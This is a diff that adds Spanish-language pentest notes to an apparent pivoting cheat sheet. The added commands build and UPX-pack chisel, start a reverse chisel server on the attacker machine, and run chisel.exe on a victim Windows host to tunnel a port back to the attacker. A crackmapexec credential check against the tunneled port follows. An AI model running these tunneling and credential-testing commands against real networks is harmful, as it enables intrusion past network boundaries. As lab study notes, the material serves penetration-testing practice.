@@ -1238,6 +1238,32 @@ ping -n 1 <RHOST>
 ./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
 ```
 
+```c
+go build .
+go build -ldflags "-s -w" .
+upx chisel
+```
+
+
+
+1. enviar a la maquina linux el archivo chisel de windows
+2. En nuestra maquina atacante ejecutamos el chisel para abrir el puerto que queramos en modo serve
+```c
+./chisel server --reverse --port 1234
+```
+
+3. En la maquina victima, se ejecuta el chisel en modo cliente→
+```c
+C:\Windows\Temp\chisel.exe client IP:1234 R:PORTQUEREMOSABRIR:127.0.0.1:PORTQQUEREMOSABRIR
+```
+
+1) se conecta a el puerto 1234 del servidor chisel
+2) R → remotee port fordwarding para que el puerto 445 se convierta en el puerto 445 de la maquina atacante local
+
+```c
+crackmapexec 127.0.0.1 -u 'username'  -p 'password '
+```
+
 ###### SOCKS5 / Proxychains Configuration
 
 - LHOST > APPLICATION SERVER > NETWORK
